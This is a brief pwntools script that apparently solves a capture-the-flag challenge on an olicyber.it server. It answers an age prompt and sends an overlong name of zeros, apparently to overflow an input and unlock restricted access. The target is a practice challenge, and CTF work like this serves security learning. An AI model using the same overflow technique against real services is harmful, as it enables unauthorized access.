import pwn

r= pwn.remote("moreprivateclub.challs.olicyber.it", 10016)

r.recvuntil(b"how old are you?")
r.sendline(b"25")
r.recvuntil(b"What is your name?")
r.sendline(b"0000000000000000000000")